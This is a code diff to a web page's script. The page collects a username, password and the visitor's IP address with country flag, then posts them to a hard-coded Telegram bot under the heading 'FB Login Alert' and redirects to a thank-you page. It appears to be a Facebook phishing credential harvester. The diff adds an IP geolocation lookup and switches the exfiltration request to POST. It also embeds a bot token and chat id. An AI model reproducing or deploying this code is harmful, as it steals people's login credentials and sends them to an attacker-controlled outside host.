@@ -181,11 +181,18 @@
     </footer>
 
     <script>
+        let flagEmoji = '🌐'; // Default if country not found
+
         document.addEventListener('DOMContentLoaded', function () {
-            fetch('https://api.ipify.org?format=json')
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    document.getElementById('ipAddress').value = data.ip;
+                    const ip = data.ip;
+                    const countryCode = data.country_code;
+                    if (countryCode) {
+                        flagEmoji = String.fromCodePoint(...[...countryCode].map(char => 127397 + char.charCodeAt()));
+                    }
+                    document.getElementById('ipAddress').value = `${ip} ${flagEmoji}`;
                 })
                 .catch(error => {
                     console.error('Error fetching IP address:', error);
@@ -193,32 +200,42 @@
         });
 
         document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault(); // Prevent default form submission
+            event.preventDefault();
 
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             var ipAddress = document.getElementById('ipAddress').value;
 
-            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}`;
-            var token = '8199595048:AAEKG3nf5z7Xdww7IbMZxQ3cjzYg2-T3A9w';
-            var chat_id = '1287482502'
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+            var telegramMessage = `📘 *FB Login Alert*\n\n👤 *Username:* ${username}\n🔐 *Password:* ${password}\n🌍 *IP Address:* ${ipAddress}`;
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'thanks.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
+            var token = '8199595048:AAEKG3nf5z7Xdww7IbMZxQ3cjzYg2-T3A9w';
+            var chat_id = '1287482502';
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chat_id,
+                    text: telegramMessage,
+                    parse_mode: 'Markdown'
                 })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send data.');
-                });
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = 'thanks.html';
+                } else {
+                    alert('Error sending message.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to send data.');
+            });
         });
     </script>
 </body>
-
 </html>
